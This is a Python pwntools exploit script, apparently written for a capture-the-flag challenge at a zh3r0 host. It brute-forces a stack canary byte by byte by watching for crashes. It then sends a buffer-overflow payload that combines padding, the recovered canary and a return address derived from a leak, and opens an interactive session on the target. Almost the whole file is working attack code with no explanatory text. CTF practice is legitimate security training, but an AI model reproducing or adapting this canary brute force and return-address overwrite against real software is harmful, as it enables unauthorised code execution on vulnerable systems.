from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = ''
# elf = ELF(program,checksec=False)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = 'asia.pwn.zh3r0.ml'
    port = '3248'

    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here

def check_crash(content):
	xp = remote(host,port)
	xp.sendlineafter("->","yes")
	xp.sendlineafter("->","yes")
	xp.recvuntil("->")
	leak = int(xp.recvline()[:-1],16)
	xp.sendafter("->",content)
	test = xp.recv(4)
	return test == "Core"

def brute(base):
	current = base
	result = ""

	for i in range(8):
		for ch in range(256):
			test = current + chr(ch)

			res = check_crash(test)
			if not res:
				log.info("Found valid char: %s" % hex(ch))
				pause()
				current += chr(ch)
				result += chr(ch)
				break

	return result
# check_crash(36)
# offset = 36
canary = "\xc1\x16\x8b\x99\x91\x9b\x1a\x31"

# brute("A"*36+canary+p64(0)+32(0))
xp = remote(host,port)
xp.sendlineafter("->","yes")
xp.sendlineafter("->","yes")
xp.recvuntil("->")
leak = int(xp.recvline()[:-1],16)
log.info("leak : %s" % hex(leak))


p = "A"*36
p += canary
p += p64(0)
p += p32(0)
p += p64(leak + 0x10a38c)

xp.sendafter("->",p)

xp.interactive()
